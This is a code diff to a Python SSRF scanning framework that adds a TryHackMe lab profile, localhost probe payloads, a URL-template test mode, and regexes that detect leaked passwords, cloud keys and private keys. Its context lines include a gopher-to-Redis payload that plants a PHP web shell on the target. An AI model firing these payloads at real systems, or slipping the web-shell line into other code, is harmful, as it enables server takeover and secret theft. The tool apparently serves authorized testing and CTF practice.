@@ -109,6 +109,22 @@ DANGEROUS_SSRF_PAYLOADS = [
     "gopher://127.0.0.1:6379/_config%20set%20dir%20/var/www/html%0d%0aconfig%20set%20dbfilename%20cmd.php%0d%0aset%20payload%20%22%3C%3Fphp%20system($_GET['cmd'])%3B%3F%3E%22%0d%0asave%0d%0a",
 ]
 
+THM_LOCAL_SSRF_PAYLOADS = [
+    "localhost/copyright",
+    "localhost/hello",
+    "localhost/config",
+    "localhost/connection",
+    "localhost/connection.php",
+    "localhost/config.php",
+    "localhost/db",
+    "localhost/admin",
+    "localhost/.env",
+    "http://localhost/copyright",
+    "http://localhost/config",
+    "http://127.0.0.1/copyright",
+    "http://127.0.0.1/config",
+]
+
 
 @dataclass
 class SSRFEvidence:
@@ -129,6 +145,7 @@ class ScanAttempt:
     param: str; payload: str; status: int; vulnerable: bool = False
     result: str = "not_confirmed"; severity: str = "info"; confidence: str = "low"
     matched_patterns: Optional[List[str]] = None; error: Optional[str] = None
+    body_snippet: str = ""; content_length: int = 0
 
 
 def setup_argparse():
@@ -139,8 +156,12 @@ def setup_argparse():
     target_group.add_argument("--targets")
     target_group.add_argument("--target-file", "-f")
     parser.add_argument("--param", help="Specific parameter to test on a single target. Only supported with --target.")
+    parser.add_argument("--path", action="append", help="Specific path to test. Can be used multiple times. Example: --path /")
     parser.add_argument("--payload", action="append", help="Custom SSRF payload to test. Can be used multiple times.")
     parser.add_argument("--payload-file", help="File containing custom payloads, one per line.")
+    parser.add_argument("--url", help="Exact URL template to test. Use PAYLOAD as placeholder, example: http://host/?url=PAYLOAD")
+    parser.add_argument("--lab-profile", choices=["generic", "thm", "thm-basic-ssrf"], default="generic", help="Enable lab-friendly defaults for CTF/THM targets")
+    parser.add_argument("--body-snippet-size", type=int, default=1200, help="Max response body snippet stored per payload attempt")
     parser.add_argument("--callback", "-c")
     parser.add_argument("--collaborator")
     parser.add_argument("--burp-collaborator")
@@ -237,12 +258,17 @@ class ProxyManager:
             return p
 
 
-def load_custom_payloads(payloads=None, payload_file=None):
+def load_custom_payloads(payloads=None, payload_file=None, lab_profile="generic"):
     items = []
+    default_payload_file = Path("payloads.txt")
+    if lab_profile in ("thm", "thm-basic-ssrf"):
+        items.extend(THM_LOCAL_SSRF_PAYLOADS)
     for payload in payloads or []:
         payload = str(payload).strip()
         if payload:
             items.append(payload)
+    if payload_file is None and default_payload_file.is_file():
+        payload_file = str(default_payload_file)
     if payload_file:
         with open(payload_file, encoding="utf-8") as f:
             for line in f:
@@ -424,21 +450,22 @@ class AISkills:
 
     async def generate_payloads(self, context: dict) -> List[str]:
         sys = (
-            "You are helping an authorized security testing tool generate SSRF test payloads. "
-            "Return only a JSON array of strings. "
-            "Generate safe, non-destructive SSRF payloads focused on detection and validation. "
-            "Prefer callback/OAST, cloud metadata read-only probes, localhost variants, URL parser bypasses, "
-            "DNS helper domains, redirects, encoded URL forms, IPv6/decimal/octal forms, and scheme confusion checks. "
-            "Do not include explanations. Return JSON only."
+            "Generate safe SSRF and endpoint-validation payloads. "
+            "Return JSON array of strings only. "
+            "Cover OAST, localhost, metadata, redirects, encoded IPs, IPv6, parser bypasses, bad schemes, malformed URLs and edge cases. "
+            "No destructive payloads."
         )
-        usr = (
-            f"Target: {context.get('target')}\n"
-            f"WAF: {context.get('waf', 'none')}\n"
-            f"Cloud: {context.get('cloud', 'unknown')}\n"
-            f"Callback host: {context.get('callback_host', '')}\n"
-            f"Endpoints: {json.dumps(context.get('endpoints', []), ensure_ascii=False)}\n"
-            f"Parameters: {json.dumps(context.get('params', []), ensure_ascii=False)}\n"
-            "Generate 10 safe SSRF payloads."
+        usr = json.dumps(
+            {
+                "target": context.get("target"),
+                "waf": context.get("waf", "none"),
+                "cloud": context.get("cloud", "unknown"),
+                "callback": context.get("callback_host", ""),
+                "endpoints": context.get("endpoints", [])[:10],
+                "params": context.get("params", [])[:20],
+                "count": 15,
+            },
+            ensure_ascii=False,
         )
         resp = await self.llm.generate(sys, usr)
         llm_payloads = []
@@ -590,7 +617,10 @@ class WAFFingerprinter:
 class UltimateSSRFFramework:
     def __init__(self, target, args):
         self.target = target
+        self.lab_profile = getattr(args, "lab_profile", "generic")
         self.scheme = getattr(args, "scheme", "https")
+        if self.lab_profile in ("thm", "thm-basic-ssrf") and not target.startswith(("http://", "https://")):
+            self.scheme = "http"
         if target.startswith(("http://", "https://")):
             self.base = target.rstrip("/")
             parsed_target = urllib.parse.urlparse(target)
@@ -602,7 +632,12 @@ class UltimateSSRFFramework:
         self.verbose = not args.quiet
         self.headless = not args.visible
         self.user_param = getattr(args, "param", None)
-        self.custom_payloads = load_custom_payloads(getattr(args, "payload", None), getattr(args, "payload_file", None))
+        self.url_template = getattr(args, "url", None)
+        self.manual_paths = self._normalize_manual_paths(getattr(args, "path", None))
+        if self.lab_profile in ("thm", "thm-basic-ssrf") and not self.manual_paths:
+            self.manual_paths = ["/"]
+        self.body_snippet_size = max(0, int(getattr(args, "body_snippet_size", 1200) or 0))
+        self.custom_payloads = load_custom_payloads(getattr(args, "payload", None), getattr(args, "payload_file", None), self.lab_profile)
         self.proxy = args.proxy
         self.proxy_file = args.proxy_file
         self.proxy_type = args.proxy_type
@@ -653,7 +688,7 @@ class UltimateSSRFFramework:
         self.playwright = None; self.browser = None; self.page = None
         self.sem = asyncio.Semaphore(15)
 
-        safe = re.sub(r'[^a-zA-Z0-9.-]', '_', target)
+        safe = re.sub(r'[^a-zA-Z0-9.-]', '_', self.target)
         ts = datetime.now().strftime('%Y%m%d_%H%M%S')
         self.json_file = self.output_dir / f"ssrf_{safe}_{ts}.json"
         self.html_file = self.output_dir / f"ssrf_report_{safe}_{ts}.html"
@@ -729,36 +764,75 @@ class UltimateSSRFFramework:
             except Exception as e:
                 return 0, "", {"_error": str(e)}
 
+    async def direct_http_request(self, method, url, data=None, headers=None):
+        if not AIOHTTP_AVAILABLE:
+            return await self.request(method, url, data=data, headers=headers)
+        async with self.sem:
+            try:
+                timeout = aiohttp.ClientTimeout(total=20)
+                async with aiohttp.ClientSession(timeout=timeout) as session:
+                    if method.upper() == "GET":
+                        async with session.get(url, headers=headers or {}, allow_redirects=True) as response:
+                            body = await response.text(errors="replace")
+                            await asyncio.sleep(self.delay)
+                            return response.status, body, dict(response.headers)
+                    async with session.request(method.upper(), url, json=data, headers=headers or {}, allow_redirects=True) as response:
+                        body = await response.text(errors="replace")
+                        await asyncio.sleep(self.delay)
+                        return response.status, body, dict(response.headers)
+            except Exception as e:
+                return 0, "", {"_error": str(e)}
+
     async def check_evidence(self, phase, technique, url, endpoint, param, payload, status, body, headers):
         patterns = [
-            (r'root:[^:]+:[0-9]+:[0-9]+:', '/etc/passwd', 'critical'),
-            (r'AKIA[0-9A-Z]{16}', 'AWS key', 'critical'),
-            (r'computeMetadata|metadata\.google\.internal', 'Cloud metadata', 'high'),
-            (r'169\.254\.\d{1,3}\.\d{1,3}', 'Cloud metadata IP', 'high'),
-            (r'10\.\d{1,3}\.\d{1,3}\.\d{1,3}', 'Internal IP', 'high'),
-            (r'192\.168\.\d{1,3}\.\d{1,3}', 'Internal IP', 'high'),
-            (r'\$username\s*=|\$password\s*=|\$adminURL\s*=', 'Sensitive PHP configuration disclosure', 'critical'),
-            (r'DB_(HOST|USER|USERNAME|PASSWORD|PASS)\s*=|database_password|mysql_password', 'Database configuration disclosure', 'critical'),
-            (r'private_key|api[_-]?key|secret[_-]?key|access[_-]?token', 'Sensitive secret marker', 'high'),
+            (r'root:[^:\n]+:[0-9]+:[0-9]+:', '/etc/passwd disclosure', 'critical'),
+            (r'AKIA[0-9A-Z]{16}', 'AWS access key disclosure', 'critical'),
+            (r'aws_access_key_id\s*[=:]', 'AWS credential configuration disclosure', 'critical'),
+            (r'aws_secret_access_key\s*[=:]', 'AWS secret key disclosure', 'critical'),
+            (r'computeMetadata|metadata\.google\.internal', 'Cloud metadata response marker', 'high'),
+            (r'169\.254\.\d{1,3}\.\d{1,3}', 'Cloud metadata IP reference', 'high'),
+            (r'10\.\d{1,3}\.\d{1,3}\.\d{1,3}', 'Internal IP reference', 'medium'),
+            (r'192\.168\.\d{1,3}\.\d{1,3}', 'Internal IP reference', 'medium'),
+            (r'172\.(1[6-9]|2[0-9]|3[0-1])\.\d{1,3}\.\d{1,3}', 'Internal IP reference', 'medium'),
+            (r'\$adminURL\s*=\s*["\'][^"\']+', 'PHP admin URL disclosure', 'high'),
+            (r'\$username\s*=\s*["\'][^"\']+', 'PHP username disclosure', 'critical'),
+            (r'\$password\s*=\s*["\'][^"\']+', 'PHP password disclosure', 'critical'),
+            (r'\$db(user|username|pass|password|host)\s*=', 'PHP database config disclosure', 'critical'),
+            (r'DB_(HOST|USER|USERNAME|PASSWORD|PASS|NAME)\s*[=:]', 'Database configuration disclosure', 'critical'),
+            (r'(database_password|mysql_password|postgres_password)\s*[=:]', 'Database password disclosure', 'critical'),
+            (r'(api[_-]?key|secret[_-]?key|access[_-]?token|auth[_-]?token)\s*[=:]', 'Sensitive secret marker', 'critical'),
+            (r'BEGIN (RSA |OPENSSH |EC |DSA )?PRIVATE KEY', 'Private key disclosure', 'critical'),
+            (r'Username\s*:\s*[^\s<]{3,}', 'Username disclosure marker', 'medium'),
+            (r'Password\s*:\s*[^\s<]{3,}', 'Password disclosure marker', 'critical'),
+            (r'(?i)(connection\.php|config\.php|\.env|database configuration|db_password)', 'Sensitive configuration marker', 'high'),
+            (r'(?i)(warning|fatal error|stack trace|traceback|uncaught exception).*?(php|python|node|java)', 'Application error disclosure', 'medium'),
         ]
         matched = []
-        combined = (body + json.dumps(headers)).lower()
+        body_text = body or ""
+        header_text = json.dumps(headers or {})
+        combined = body_text + "\n" + header_text
         for pat, desc, sev in patterns:
-            if re.search(pat, combined, re.I):
+            if re.search(pat, combined, re.I | re.S):
                 matched.append(f"[{sev.upper()}] {desc}")
-        if self.cb and self.cb in body:
+        payload_low = str(payload).lower()
+        if status == 200 and self.lab_profile in ("thm", "thm-basic-ssrf"):
+            if any(x in payload_low for x in ("localhost/config", "localhost/connection", "localhost/.env", "127.0.0.1/config")):
+                if re.search(r'(\$username|\$password|\$adminURL|Username\s*:|Password\s*:|DB_|api[_-]?key|secret|token|connection\.php|config\.php)', combined, re.I):
+                    matched.append("[CRITICAL] THM local SSRF sensitive resource disclosure")
+        if self.cb and self.cb in body_text:
             matched.append("[CRITICAL] Callback in response")
         if matched:
-            sev_order = {"CRITICAL":0,"HIGH":1,"MEDIUM":2,"LOW":3}
-            sev = min(sev_order.get(p.split("]")[0].replace("[",""),3) for p in matched)
+            sev_rank = {"CRITICAL":0,"HIGH":1,"MEDIUM":2,"LOW":3}
+            sev = min(sev_rank.get(p.split("]")[0].replace("[",""),3) for p in matched)
             sev_map = {0:"critical",1:"high",2:"medium",3:"low"}
             ev = SSRFEvidence(phase=phase, technique=technique, url=url, endpoint=endpoint, param=param,
-                              payload=payload, status=status, body_snippet=body[:300],
-                              matched_patterns=matched, severity=sev_map.get(sev,"info"))
+                              payload=payload, status=status, body_snippet=self._make_body_snippet(body_text),
+                              matched_patterns=list(dict.fromkeys(matched)), severity=sev_map.get(sev,"info"), response_headers=headers)
             ev.impact_score = self._impact(ev)
             self.evidence.append(ev)
-            ips = re.findall(r'(10\.\d{1,3}\.\d{1,3}\.\d{1,3}|172\.(1[6-9]|2[0-9]|3[0-1])\.\d{1,3}\.\d{1,3}|192\.168\.\d{1,3}\.\d{1,3})', body)
-            for ip in ips: self.internal_ips.add(ip[0])
+            ips = re.findall(r'(10\.\d{1,3}\.\d{1,3}\.\d{1,3}|172\.(1[6-9]|2[0-9]|3[0-1])\.\d{1,3}\.\d{1,3}|192\.168\.\d{1,3}\.\d{1,3})', body_text)
+            for ip in ips:
+                self.internal_ips.add(ip[0] if isinstance(ip, tuple) else ip)
             return [ev]
         return []
 
@@ -803,8 +877,80 @@ class UltimateSSRFFramework:
             phase=phase, technique=technique, target=self.target, tested_url=url,
             endpoint=ep.path, param=param, payload=payload, status=status,
             vulnerable=vulnerable, result=result, severity=severity, confidence=confidence,
-            matched_patterns=matched_patterns, error=error
+            matched_patterns=matched_patterns, error=error,
+            body_snippet=self._make_body_snippet(body), content_length=len(body or "")
         ))
+        return vulnerable
+
+    async def test_url_template_payload(self, payload, phase="Direct URL", technique="Exact URL template"):
+        if not self.url_template:
+            return False
+        if "PAYLOAD" not in self.url_template:
+            if self.verbose:
+                print(f"{WARN} --url template must contain PAYLOAD placeholder")
+            return False
+        if not isinstance(payload, str):
+            payload = str(payload)
+        payload = payload.strip()
+        if not payload:
+            return False
+        tested_url = self.url_template.replace("PAYLOAD", urllib.parse.quote(payload, safe="/:"))
+        self._register_callback_context(payload, "/", self.user_param or "url", phase, technique)
+        status, body, headers = await self.direct_http_request("GET", tested_url)
+        findings = await self.check_evidence(
+            phase,
+            technique,
+            tested_url,
+            "/",
+            self.user_param or "url",
+            payload,
+            status,
+            body,
+            headers,
+        )
+        error = headers.get("_error") if isinstance(headers, dict) else None
+        vulnerable = bool(findings)
+        if vulnerable:
+            best = findings[0]
+            result = "vulnerable"
+            severity = best.severity
+            confidence = "high" if best.out_of_band_hit else "medium"
+            matched_patterns = best.matched_patterns
+        elif error:
+            result = "error"
+            severity = "info"
+            confidence = "low"
+            matched_patterns = []
+        else:
+            result = "not_confirmed"
+            severity = "info"
+            confidence = "low"
+            matched_patterns = []
+        self.scan_attempts.append(ScanAttempt(
+            phase=phase,
+            technique=technique,
+            target=self.target,
+            tested_url=tested_url,
+            endpoint="/",
+            param=self.user_param or "url",
+            payload=payload,
+            status=status,
+            vulnerable=vulnerable,
+            result=result,
+            severity=severity,
+            confidence=confidence,
+            matched_patterns=matched_patterns,
+            error=error,
+            body_snippet=self._make_body_snippet(body),
+            content_length=len(body or ""),
+        ))
+        if self.verbose:
+            if vulnerable:
+                print(f"  {RED}[VULNERABLE]{RESET} {tested_url}")
+            elif error:
+                print(f"  {DIM}[ERROR]{RESET} {tested_url} error={error}")
+            else:
+                print(f"  {DIM}[NOT CONFIRMED]{RESET} {tested_url}")
         return vulnerable
 
     async def discover(self):
@@ -839,6 +985,8 @@ class UltimateSSRFFramework:
                                             content_type=h.get("content-type",""))
                     self.endpoints.append(ep)
             except: pass
+        self._ensure_manual_endpoints()
+        self.endpoints = self._prioritized_endpoints()
         if self.verbose: print(f"  {OK} {len(self.endpoints)} endpoints")
 
     async def detect_cloud(self):
@@ -1070,6 +1218,72 @@ class UltimateSSRFFramework:
     def _safe_target_name(self):
         return re.sub(r'[^a-zA-Z0-9.-]', '_', self.target)
 
+    def _normalize_manual_paths(self, paths):
+        normalized = []
+        for path in paths or []:
+            path = str(path).strip() or "/"
+            if path.startswith(("http://", "https://")):
+                parsed = urllib.parse.urlparse(path)
+                path = parsed.path or "/"
+                if parsed.query:
+                    path = f"{path}?{parsed.query}"
+            if not path.startswith("/"):
+                path = "/" + path
+            if path not in normalized:
+                normalized.append(path)
+        return normalized
+
+    def _is_static_asset(self, path):
+        path_low = (path or "").lower().split("?", 1)[0]
+        return path_low.endswith((".js", ".css", ".png", ".jpg", ".jpeg", ".gif", ".svg", ".ico", ".woff", ".woff2", ".ttf", ".map"))
+
+    def _make_body_snippet(self, body):
+        if not body or self.body_snippet_size <= 0:
+            return ""
+        text = re.sub(r'\s+', ' ', str(body)).strip()
+        return text[:self.body_snippet_size]
+
+    def _ensure_endpoint(self, path="/", params=None, status=0, content_type="manual"):
+        path = path or "/"
+        if not path.startswith("/"):
+            path = "/" + path
+        for ep in self.endpoints:
+            if ep.path == path:
+                if params:
+                    ep.params.update(params)
+                    self.params.update(params)
+                return ep
+        ep = DiscoveredEndpoint(path=path, method="GET", params=set(params or []), accepts_url_param=True, test_response_code=status, content_type=content_type)
+        self.endpoints.insert(0, ep)
+        self.params.update(ep.params)
+        return ep
+
+    def _ensure_manual_endpoints(self):
+        if self.manual_paths:
+            for path in reversed(self.manual_paths):
+                self._ensure_endpoint(path, params=[self.user_param] if self.user_param else ["url"])
+        elif self.user_param or self.custom_payloads or self.lab_profile in ("thm", "thm-basic-ssrf"):
+            self._ensure_endpoint("/", params=[self.user_param] if self.user_param else ["url"])
+
+    def _prioritized_endpoints(self):
+        def score(ep):
+            if ep.path in self.manual_paths:
+                return 0
+            if ep.path == "/":
+                return 1
+            if "?" in ep.path:
+                return 2
+            if self._is_static_asset(ep.path):
+                return 9
+            return 4
+        seen = set()
+        ordered = []
+        for ep in sorted(self.endpoints, key=score):
+            if ep.path not in seen:
+                seen.add(ep.path)
+                ordered.append(ep)
+        return ordered
+
     def _write_ai_payload_log(self, payloads, ai_payloads):
         if not payloads:
             return
@@ -1196,11 +1410,15 @@ class UltimateSSRFFramework:
             "framework_version": "5.0-waf-aware",
             "cloud": self.cloud,
             "waf": self.waf_info,
+            "lab_profile": self.lab_profile,
+            "manual_paths": self.manual_paths,
             "is_vulnerable_to_ssrf": bool(vulnerable_attempts) or bool(self.evidence),
             "status": "vulnerable" if vulnerable_attempts or self.evidence else "not_confirmed",
             "total_findings": len(self.evidence),
             "unique_findings": len(self._dedup()),
             "callbacks": len(self.callbacks),
+            "lab_profile": self.lab_profile,
+            "manual_paths": self.manual_paths,
             "custom_payloads": self.custom_payloads,
             "attempt_summary": {
                 "total": len(attempts),
@@ -1275,7 +1493,7 @@ body{font-family:Arial;background:#1a1a2e;color:#eee;padding:20px}.header{backgr
 <div class="header"><h1>Ultimate SSRF Framework v5.0 Report</h1><p>Target: <strong>{{target}}</strong></p><p>Date: {{date}}</p><p>Status: {% if vulnerable %}<span class="badge badge-vulnerable">VULNERABLE / CONFIRMED SIGNAL</span>{% else %}<span class="badge badge-not_confirmed">NOT CONFIRMED</span>{% endif %}</p></div>
 <div class="card"><h2>Summary</h2><p>WAF: {{waf}}</p><p>Cloud: {{cloud}}</p><p>Endpoints: {{endpoints}}</p><p>Findings: {{findings}} raw / {{unique}} unique</p><p>Callbacks: {{callbacks}}</p><p>Total Attempts: {{attempts|length}}</p><p>Not Confirmed: {{not_confirmed|length}}</p><p>Errors: {{errors|length}}</p></div>
 <div class="card"><h2>Confirmed Findings</h2><table><tr><th>Endpoint</th><th>Parameter</th><th>Severity</th><th>Callbacks</th></tr>{% for v in vulns %}<tr><td>{{v.endpoint}}</td><td>{{v.param}}</td><td><span class="badge badge-{{v.severity}}">{{v.severity.upper()}}</span></td><td>{{v.oob}}</td></tr>{% endfor %}</table></div>
-<div class="card"><h2>Payload Attempts</h2><table><tr><th>Result</th><th>Status</th><th>Endpoint</th><th>Param</th><th>Payload</th><th>Evidence / Error</th></tr>{% for a in attempts %}<tr><td><span class="badge badge-{{a.result}}">{{a.result}}</span></td><td>{{a.status}}</td><td>{{a.endpoint}}</td><td>{{a.param}}</td><td><code>{{a.payload}}</code></td><td>{% if a.matched_patterns %}{{a.matched_patterns | join(", ") }}{% elif a.error %}{{a.error}}{% else %}No SSRF evidence confirmed for this payload.{% endif %}</td></tr>{% endfor %}</table></div>
+<div class="card"><h2>Payload Attempts</h2><table><tr><th>Result</th><th>Status</th><th>Endpoint</th><th>Param</th><th>Payload</th><th>Evidence / Error</th><th>Response Snippet</th></tr>{% for a in attempts %}<tr><td><span class="badge badge-{{a.result}}">{{a.result}}</span></td><td>{{a.status}}</td><td>{{a.endpoint}}</td><td>{{a.param}}</td><td><code>{{a.payload}}</code></td><td>{% if a.matched_patterns %}{{a.matched_patterns | join(", ") }}{% elif a.error %}{{a.error}}{% else %}No SSRF evidence confirmed for this payload.{% endif %}</td><td><code>{{a.body_snippet}}</code></td></tr>{% endfor %}</table></div>
 <div class="card"><h2>AI Suggested Safe Checks</h2><table><tr><th>Issue Type</th><th>Result</th><th>Status</th><th>Endpoint</th><th>Param</th><th>Evidence / Reason</th></tr>{% for item in other_issue_attempts %}<tr><td>{{item.issue_type}}</td><td><span class="badge badge-{{item.result}}">{{item.result}}</span></td><td>{{item.status}}</td><td>{{item.endpoint}}</td><td>{{item.param}}</td><td>{% if item.evidence %}{{item.evidence | join(", ") }}{% else %}{{item.reason}}{% endif %}</td></tr>{% endfor %}</table></div>
 </body>
 </html>
@@ -1293,6 +1511,8 @@ body{font-family:Arial;background:#1a1a2e;color:#eee;padding:20px}.header{backgr
             "framework_version": "5.0-waf-aware",
             "cloud": self.cloud,
             "waf": self.waf_info,
+            "lab_profile": self.lab_profile,
+            "manual_paths": self.manual_paths,
             "is_vulnerable_to_ssrf": vulnerable,
             "status": "vulnerable" if vulnerable else "not_confirmed",
             "endpoints": [{"path": e.path, "method": e.method, "params": list(e.params), "status": e.test_response_code, "content_type": e.content_type} for e in self.endpoints],
@@ -1331,10 +1551,30 @@ body{font-family:Arial;background:#1a1a2e;color:#eee;padding:20px}.header{backgr
     async def run(self):
         print(f"\n{BOLD}{'='*50}{RESET}\n{BOLD}Target:{RESET} {self.target}\n{BOLD}Callback:{RESET} {self.cb}")
         if self.dangerous_payloads: print(f"{BOLD}{RED}DANGEROUS payloads enabled!{RESET}")
+        if self.lab_profile != "generic" and self.verbose:
+            print(f"{OK} Lab profile: {self.lab_profile}")
+        if self.manual_paths and self.verbose:
+            print(f"{OK} Manual paths: {', '.join(self.manual_paths)}")
         if self.custom_payloads and self.verbose:
             print(f"{OK} Loaded {len(self.custom_payloads)} custom payloads")
         await self.start()
         try:
+            if self.url_template:
+                payloads = self.custom_payloads or ["localhost/config"]
+                if self.verbose:
+                    print(f"\n{CYAN}[DIRECT URL]{RESET} Testing exact URL template...")
+                for payload in payloads:
+                    await self.test_url_template_payload(payload, "Direct URL", "Exact URL template")
+                if not self.evidence and self.verbose:
+                    print(f"\n{OK} No confirmed SSRF findings detected. Generating not_confirmed report.")
+                self.export_nuclei()
+                self.export_siem_cef()
+                self.export_json_api()
+                self.generate_attack_map()
+                await self.generate_html()
+                await self.save_json()
+                self.print_summary()
+                return
             await self.discover()
             if not self.no_waf:
                 s, b, h = await self.request("GET", self.base)
